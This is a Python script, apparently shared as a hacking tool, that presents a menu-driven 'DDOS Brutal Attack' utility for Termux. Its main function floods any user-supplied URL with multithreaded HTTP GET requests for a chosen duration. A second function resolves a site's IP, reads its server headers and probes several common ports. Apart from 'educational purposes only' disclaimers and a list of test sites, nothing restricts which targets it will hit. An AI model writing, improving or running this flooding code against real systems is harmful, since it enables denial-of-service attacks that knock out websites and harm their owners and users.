#!/usr/bin/env python3
"""
🔥 DDOS TERMUX - PRIVATE TOOLS
=================================
Author: RpaezzXploit
GitHub: github.com/teguhganteng123
=================================
⚠️ For educational purposes only!
"""

import argparse
import sys
import requests
import threading
import time
import hashlib
import socket
import os

# ============ MENU SYSTEM ============
def show_menu():
    menu = """
╔═══════════════════════════════════════╗
║    🔥 DDOS PRIVATE TOOLS              ║
║    BY : RpaezzXploit                  ║
║    Version: 3.0 - MENU EDITION        ║
╚═══════════════════════════════════════╝
===========================================

[1] 🚀 DDOS Brutal Attack
[2] 🔍 Check IP & Website Info
[3] 📊 Attack Statistics
[4] ❓ Help & Tutorial
[5] 🚪 Exit

===========================================
"""
    print(menu)
    
    choice = input("Select option [1-5]: ").strip()
    return choice

# ============ CHECK IP FUNCTION ============
def check_ip():
    print("\n" + "="*50)
    print("🔍 WEBSITE IP CHECKER")
    print("="*50)
    
    url = input("Enter website URL (e.g., example.com): ").strip()
    
    if not url:
        print("❌ URL required!")
        return
    
    # Clean URL
    if url.startswith('http://'):
        url = url[7:]
    elif url.startswith('https://'):
        url = url[8:]
    if url.startswith('www.'):
        url = url[4:]
    
    print(f"\n🔎 Checking: {url}")
    print("⏳ Please wait...")
    
    try:
        # Get IP address
        ip_address = socket.gethostbyname(url)
        
        # Get more info
        print("\n" + "="*50)
        print("📊 WEBSITE INFORMATION")
        print("="*50)
        print(f"🌐 Domain: {url}")
        print(f"📍 IP Address: {ip_address}")
        
        # Try to get server info
        try:
            response = requests.get(f"http://{url}", timeout=5, verify=False)
            print(f"📡 HTTP Status: {response.status_code}")
            
            # Check server headers
            if 'Server' in response.headers:
                print(f"🖥️  Server: {response.headers['Server']}")
            if 'X-Powered-By' in response.headers:
                print(f"⚡ Powered By: {response.headers['X-Powered-By']}")
                
        except:
            print("📡 Could not retrieve server details")
        
        # Additional checks
        print("\n🔧 Additional Checks:")
        # Check common ports
        ports = [80, 443, 8080, 21, 22, 25]
        open_ports = []
        
        for port in ports[:3]:  # Cek 3 port pertama aja biar cepat
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip_address, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        
        if open_ports:
            print(f"✅ Open Ports: {open_ports}")
        else:
            print("❌ No common ports open")
            
        print("="*50)
        
    except socket.gaierror:
        print("❌ Cannot resolve domain name")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    input("\nPress Enter to continue...")

# ============ DDOS ATTACK FUNCTION ============
def start_ddos():
    print("\n" + "="*50)
    print("🚀 DDOS BRUTAL ATTACK")
    print("="*50)
    
    # Get target
    target = input("Enter target URL: ").strip()
    if not target:
        print("❌ Target required!")
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Get duration
    try:
        duration = int(input("Duration (seconds): ").strip() or "60")
    except:
        duration = 60
    
    # Get threads
    try:
        threads = int(input("Threads (50-200): ").strip() or "100")
        threads = max(50, min(threads, 200))  # Limit 50-200
    except:
        threads = 100
    
    print(f"\n🎯 Target: {target}")
    print(f"⏱️  Duration: {duration}s")
    print(f"⚡ Threads: {threads}")
    
    # Confirmation
    confirm = input("\n⚠️  Start attack? [y/N]: ").lower()
    if confirm != 'y':
        print("Attack cancelled!")
        return
    
    # Start attack
    print("\n" + "="*50)
    print("🔥 STARTING BRUTAL ATTACK")
    print("="*50)
    
    attack_active = True
    request_count = 0
    
    def attack():
        nonlocal attack_active, request_count
        end_time = time.time() + duration
        while time.time() < end_time and attack_active:
            try:
                requests.get(target, timeout=3)
                request_count += 1
            except:
                pass
            time.sleep(0.01)
    
    # Create threads
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    # Progress display
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            minutes = elapsed // 60
            seconds = elapsed % 60
            
            print(f"\r[🟢] Attacking... {minutes:02d}:{seconds:02d} | Req: {request_count} | Rem: {remaining}s", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[🛑] Attack stopped by user")
        attack_active = False
    
    attack_active = False
    time.sleep(2)
    
    # Results
    total_time = int(time.time() - start_time)
    print(f"\n\n" + "="*50)
    print("📊 ATTACK RESULTS")
    print("="*50)
    print(f"✅ Total requests: {request_count}")
    print(f"⏱️  Duration: {total_time}s")
    print(f"⚡ Requests/second: {request_count/total_time:.1f}")
    print("="*50)
    
    input("\nPress Enter to continue...")

# ============ STATISTICS FUNCTION ============
def show_stats():
    print("\n" + "="*50)
    print("📊 TOOLS STATISTICS")
    print("="*50)
    print("🔧 Version: 3.0 Menu Edition")
    print("👤 Author: RpaezzXploit")
    print("📁 Files in repo:", len([f for f in os.listdir('.') if os.path.isfile(f)]))
    print("💾 Script size:", os.path.getsize('ddos.py'), "bytes")
    print("="*50)
    input("\nPress Enter to continue...")

# ============ HELP FUNCTION ============
def show_help():
    print("\n" + "="*50)
    print("❓ HELP & TUTORIAL")
    print("="*50)
    print("\n📚 Quick Guide:")
    print("1. DDOS Attack - Send massive requests to target")
    print("2. IP Checker - Get website IP and info")
    print("3. Use legal targets only!")
    print("\n🎯 Legal Test Targets:")
    print("• http://testphp.vulnweb.com")
    print("• http://zero.webappsecurity.com")
    print("• http://demo.testfire.net")
    print("\n⚠️  WARNING: For educational use only!")
    print("="*50)
    input("\nPress Enter to continue...")

# ============ MAIN FUNCTION ============
def main():
    # Skip password for now (simplified)
    os.system('clear' if os.name == 'posix' else 'cls')
    
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        choice = show_menu()
        
        if choice == '1':
            start_ddos()
        elif choice == '2':
            check_ip()
        elif choice == '3':
            show_stats()
        elif choice == '4':
            show_help()
        elif choice == '5':
            print("\n👋 Exiting... Stay legal!")
            break
        else:
            print("\n❌ Invalid option!")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n👋 Exiting...")
    except Exception as e:
        print(f"\n❌ Error: {e}")
